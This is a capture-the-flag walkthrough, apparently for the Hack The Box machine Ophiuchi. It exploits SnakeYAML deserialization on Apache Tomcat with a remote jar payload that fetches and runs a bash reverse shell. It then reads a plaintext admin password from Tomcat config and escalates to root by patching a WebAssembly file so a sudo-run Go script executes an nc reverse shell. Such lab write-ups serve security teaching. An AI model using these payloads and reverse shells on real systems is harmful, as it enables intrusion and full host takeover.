

  ![image](https://user-images.githubusercontent.com/64952843/165166129-a70c82e7-12d8-4280-965e-f8cdd97b6913.png)
# [OPHICHI- BOX]   

# Common Enumeration

## Namp
  
  *TCP over SSH
  *HTTP Default page
  *Host 8.2p1 Ubuntu 4ubuntu0.1 

#### code-Nmap
```bash
nmap -sC -sV  -A -oN nmap.txt  10.10.10.227
```

#### output

```bash
			map.txt 10.10.10.227
			Nmap scan report for 10.10.10.227
			Host is up (0.27s latency).
			Not shown: 998 closed ports
			PORT     STATE SERVICE VERSION
			22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
			|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
			|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
			8080/tcp open  http    Apache Tomcat 9.0.38
```


## Apache Tomcat 9.0.38
 Looking for the information of tomat changelog I found out that it was recently changed so am not going to dig much on that;

#### Output

 ![[Pasted image 20210703161123.png]]

## Default Page-YAML
 Checking the web browser at http://10.10.10.227
   
#### output
   ![[Pasted image 20210703161641.png]]
   
 it brings a parse yaml and by writing anything then executing it brings an error of security reason
   
  
#### Output
  ![[Pasted image 20210703161903.png]]
   
   
   
   After parsing some special character 
   
   ##### Screenshot 4
   ![[Pasted image 20210703162251.png]]
   
   
  
  it then gives a status of 500 at least it shows us it is doing something
  
   ##### Screenshot 5
  ![[Pasted image 20210703162511.png]]
  
   looking at the screenshot above i see a snakeyml by looking for information about it we find out that it has a javascript payload https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858 then we try to load the payload to the parse ymxl and have a listening port to see if we can get a shell.
  ### Trying the first snakeyaml payload
  ``` bash
  !!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://attacker-ip/"]  
  ]]  
]
```
   
   ##### Screenshot 6
  ![[Pasted image 20210703163531.png]]
  
  #### Terminal Listening
  a netcat listening at port 80
  
   ##### Screenshot 7
  ![[Pasted image 20210703164045.png]]
  
  but we do not find a shell at least the server was able to be reached out so we know there is a kind of vulnerability
   
   
  ### Second Execution of the payload 
  we then discover there is a github vulnerability https://github.com/artsploit/yaml-payload it is the same but given it a jar file
   
   ##### Screenshot 8 
  ![[Pasted image 20210703165035.png]]
   
   ```bash
   !!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]
```
  
  Then i have to git clone the payload so that i can follow how to built it
    
##### Screenshot 9
  ![[Pasted image 20210703165512.png]]
  
 we are to modify the #AwesomeScriptEngineFactory.java by putting a jave code execution code that will enable us have a shell
   
  ##### Screenshot 10
![[Pasted image 20210703170120.png]]

Am going to execute a reverse shell here 

##### Screenshot 11
![[Pasted image 20210703170419.png]]


  ##### Screenshot 12
![[Pasted image 20210705091422.png]]

##### code
 *Replace your ip here  [(curl http://10.10.14.201)]*
```code
  Runtime.getRuntime().exec("curl http://10.10.14.201:8000/shell.sh -o /tmp/shell.sh");
  Runtime.getRuntime().exec("bash /tmp/shell.sh");
		
```

it needs a java compiler so by installing openjdk-11-jdk it was able to compiler which the compilation is done in the yaml-payload dir

##### compiling codes
```code
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .

```
 
 After successful compiling by checking the artsploit dir you will find a java class the screenshot below a firms that
   
   ##### Screenshot 14
![[Pasted image 20210705093731.png]]

In the same yaml-payload dir add this shell.sh script which contains a bash reverse shell command that it will be called by yaml-payload.jar that we just complied which has the execution code that includes the the shell.sh see #screenshot12 

##### shell.sh code
*Replace your ip here [/10.10.14.201/8888] and specify the port in which the netcat will listen to for my case is port 8888*
```code
#!/bin/sh
bash -i >& /dev/tcp/10.10.14.201/8888 0>&1
```

##### Screenshot 15
![[Pasted image 20210705095639.png]]

### Getting the shell
Now we are ready for getting  the shell.
-First, we start a python3 HTTP server in the yaml-payload dir which it will be cointaning shell.sh and the yaml-payload.jar using ;

##### Code
```code
python3 -m http.server 
```

Then start a netcat listening at your specified port number that you specified in the shell.sh

##### Code
```code
netcat -lvnp 8888 
```
  
 Then navigate to your windows and paste this code to your parse yaml site
 
 ##### Code
 
 *Replace your ip here ["http://10.10.14.201:8000/yaml-payload.jar"]*
 ```code
 !!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.201:8000/yaml-payload.jar"]
  ]]
]
```

Finally we Get a shell as tomcat 

##### Screenshot 16
![[Pasted image 20210705102748.png]] 

##### Screenshot 17
![[Pasted image 20210705102845.png]]
 

### Finding the Details
The first thing i do is to grab the bash so i can now where it is been stored and use it to improve my shell

##### Code
```code
ls -la /bin/ | grep bash
```

##### Screenshot 18
![[Pasted image 20210705104709.png]]

There bash is being linked to the rbash so i will use the sh to improve my shell

##### Code
```code
ls -la /bin | grep sh
```

##### Screenshot 19
![[Pasted image 20210705105417.png]]

##### Improving the shell
*using sh*
##### Code
 ```code
 python3 -c 'import pty;pty.spawn("/bin/sh")'
 ```
  
 *incase i was using bash*
 ##### Code
 ```code
python3 -c 'import pty;pty.spawn("/bin/bash")' 
```

After improving the shell to avoid any  problems  to ensure that i will be still logged in in case of any trouble i stop the listening port then type this code

##### Code 
```code
stty raw -echo
```
 -fg
 -press two enters
 this work when you are not using the root account
 
 ##### Screenshot 20
 ![[Pasted image 20210705123055.png]]
 
 ##### Code
 ```code
 export TERM=linux
 ```
 
 This helps you to be able to clear when you are in the account
 
 when i list the directory i see there is /opt is the directory were to store un-bundled packages each in its sub-directory there are already built whole packages provided by an independent third party software distributors.
 
 ##### Screenshot 21
 ![[Pasted image 20210705133156.png]]
 
 if you do  not know where tomacat was installed you could perform the code below
 ##### Code
 ```code
 ps -ef
 ```
   
   or 
   use env to find where it is installed
   
   ##### Screenshot 22
   ![[Pasted image 20210705134819.png]]
   
   Then i change the directory to conf because this is where potential the information is found in the user.xml
   
   ##### Screenshot 23
   ![[Pasted image 20210705135202.png]]
   
   we look were the comment ends then we find out the username and the password
   *username=Admin*
   *pass=whythereisalimit*
   
   ##### Screenshot 23
   ![[Pasted image 20210705135519.png]]
   
   when i do sudo su  so that i can test the password against tomcat i find out that the password is not for tomcat 
   
   ##### Screenshot 25
   ![[Pasted image 20210705140513.png]]
   
   so i check to see the password belongs to who as a user in the box
   
   ##### Code
   ```code
   cat /etc/passwd | grep sh$
  ```
 
 ##### Screenshot 26
 ![[Pasted image 20210705141210.png]]
 
 it brings a weird /bin/bash  mean it has a restricted thing with bash to i just try to connect to admin using the password by ssh
 
 ##### Code
 ```code
 ssh admin@10.10.10.227
 ```
 
 ##### Screenshot 27
 ![[Pasted image 20210705141902.png]]
 
As you can see am able to log in to the admin then there is where i find the user.txt

##### Screenshot 28
![[Pasted image 20210705142654.png]]

so i did sudo -l to see what i can perform without the password and i end up finding  a sudo /usr/bin/go run /opt/wasm-functions/index.go
 which go is just the same as php

##### Screenshot 29
![[Pasted image 20210705144046.png]]


##### Screenshot 30
![[Pasted image 20210705144634.png]]
 in the screenshot above you can see its doing something with wasm .it does something to main.wasm then loading the instance then calling info and if it returns 1 it says Not ready to deploy else it going to say ready to deploy and execute deploy.sh
  
  so am going to find and send error message to /dev/null ang grep main.wasm to see where it is 
  
  ##### Code
  ```code
  find / 2>/dev/null | grep main.wasm
  ```
 
 then lt looks like there is a directory
 
 ##### Screenshot 31
 ![[Pasted image 20210705150359.png]]

when i go to the directory and try to run the command it brings not ready to deploy

##### Code
```code
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

##### Screenshot 32
![[Pasted image 20210705151154.png]]

so we have to get the wasm.main to be able to return 0 so we look for its decrypt https://github.com/WebAssembly/wabt/releases the i downloaded the Ubuntu version

then i moved it to my Ophiuchi folder and performed this code to open the gz file

##### Code
```code
tar -xzvf wabt-1.0.23-ubuntu.tar.gz
```

then i changed the directory till to the bin then started a nc to listen to my port form wasm.main 

##### Screenshot 33
![[Pasted image 20210705155300.png]]

Then i went to admin@Ophiuchi to send the main.wasm  to my box so that i can edit it
##### Code
*Replace your ip and desired port*
```code
cat main.wasm | nc 10.10.14.201 8888
```

##### Screenshot 34
![[Pasted image 20210705155741.png]]

then checked my box and performed a ctrl + C and the main.wasm was transferred

##### Screenshot 35
![[Pasted image 20210705160122.png]]

then i performed this it had a file

##### Screenshot 36
![[Pasted image 20210705164317.png]]

##### Code
*wasm2wat*
```code
./wasm2wat main.wasm
```

then i performed this to save it so i can be able to change value const value to one because our code was having not equal to one you can ref #screensht30

##### Code
```code
./wasm2wat main.wasm > main.wat
```

##### Screenshot 37
![[Pasted image 20210705170106.png]]

then constant is now changed to 1

then i did wat2wasm

##### Code
```code
./wat2wasm main.wat
```
 
 then removed the main.wasm
 then performed the wat2wam again code
 
 ##### Screenshot 38
 ![[Pasted image 20210705171050.png]]
 
 it is able to create another main.wasm
 
 After getting the better main.wasm i use the scp command to securely copy the file to the remote host that is the admin.scp command uses the ssh to transfer data so it requires a password.
 
 ##### Code
 ```code
 scp main.wasm admin@10.10.10.227:
 ```
 
 the passwd as you remember was whythereisalimt
 
 ##### Screenshot 39
 ![[Pasted image 20210705172346.png]]
 
 so if i go to admin there is a wasm
 
 ##### Screenshot 40
 ![[Pasted image 20210705172607.png]]
 
 i then make a directory to store the main.wasm and make a deploy script which is basically the shell.sh script that i used to make a reverse shell for me i just wget the shell from my box but you could copy the code to deploy.sh for instance i decided to test the deploy with a simple code that echo the id see #screenshot42
 
 ##### Code
 ```
 #!/bin/sh
 
 echo $(id)
 
```
 
 
 ##### Screenshot 41
 ![[Pasted image 20210705173905.png]]
 
 Then to the folder where their is the deploy.sh and the main.wasm
 i run the sudo code that allows me to access that file without sudo passwd 
 
 ##### Code
 ```code
 sudo /usr/bin/go run /opt/wasm-functions/index.go
```
 
  ##### Screenshot 42
 ![[Pasted image 20210705200743.png]]
 
 After having a successful outcome i decide to now edit my deploy.sh script to be able to get me a reverse shell by having a listening port
 
 #### Code
 ```code
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.201 9001 >/tmp/f
 ```
 
 ##### Screenshot 43
 ![[Pasted image 20210705201657.png]]
 
 from there i can be able to get the root flag 
 
  ##### Screenshot 43
 ![[Pasted image 20210705202015.png]]
 
 
                                                                         --END--